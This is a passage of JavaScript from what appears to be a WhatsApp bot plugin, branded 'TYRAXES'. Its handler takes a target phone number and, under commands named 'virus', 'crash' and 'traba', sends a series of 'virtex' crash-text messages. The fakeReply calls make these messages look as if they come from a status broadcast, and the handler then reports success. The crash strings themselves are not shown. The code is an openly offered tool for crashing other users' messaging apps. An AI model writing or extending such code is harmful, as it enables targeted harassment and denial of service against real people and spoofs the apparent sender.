...
const handler = async (m, {conn, args, text, command, usedPrefix, participants}) => {
  ...
  if (!text) from = `${m.chat}`;
  if (text && isNaN(text)) throw '𝕬𝖗𝖑𝖔𝖉𝖗𝖆𝖌𝖔𝖓 𝖎𝖘 𝖒𝖞 𝖔𝖜𝖓𝖊𝖗 *[❗𝐈𝐍𝐅𝐎❗] THE TEXT MUST BE A NUMBER, TO WHICH THE CRASH VIRUS WILL BE SENT*';

  let send;
  if (text) send = `@${text.replace(/[^0-9]/g, '')}`;
  if (!text) send = `T҈Y҈R҈A҈X҈E҈S҈ IT'S CHAT`;
  ...
  switch (command) {
    case 'virus': case 'binario': case 'traba': case 'crash': case 'virus1': case 'c1': case 'binario1': case 'traba1': case 'crash1': {
      conn.fakeReply(from, virtex1, '0@s.whatsapp.net', '🔥 *By TYRAXES bot* 🔥', 'status@broadcast');
      conn.fakeReply(from, virtex2, '0@s.whatsapp.net', '🔥 *By TYRAXES bot* 🔥', 'status@broadcast');
      conn.fakeReply(from, virtex3, '0@s.whatsapp.net', '🔥 *By TYRAXES bot* 🔥', 'status@broadcast');
      conn.fakeReply(from, virtex4, '0@s.whatsapp.net', '🔥 *By TYRAXES bot* 🔥', 'status@broadcast');
      conn.fakeReply(from, virtex5, '0@s.whatsapp.net', '🔥 *By TYRAXES bot* 🔥', 'status@broadcast');}
      break;
    ...
    case 'virus5': case 'c5': case 'binario5': case 'traba5': case 'crash5': {
      conn.fakeReply(from, virtex6, '0@s.whatsapp.net', '🔥 *By T҈Y҈R҈A҈X҈E҈S҈ bot* 🔥', 'status@broadcast');
      conn.fakeReply(from, virtex7, '0@s.whatsapp.net', '🔥 *By T҈Y҈R҈A҈X҈E҈S҈ bot* 🔥', 'status@broadcast');
      conn.fakeReply(from, virtex8, '0@s.whatsapp.net', '🔥 *By T҈Y҈R҈A҈X҈E҈S҈ bot* 🔥', 'status@broadcast');}
      break;
    case 'virus6': case 'c6': case 'binario6': case 'traba6': case 'crash6': {
      ...
      await conn.sendContact(from, '🔥 VIRUS CRASH BY T҈Y҈R҈A҈X҈E҈S҈ 🔥', fkontaak);}
      break;
  ...
  await conn.reply(m.chat, `*[🫨] SUCCESSFULLY SENT ${command.toUpperCase()} 𝙰 ${send}*`, m, {mentions: [conn.parseMention(send)]});
};
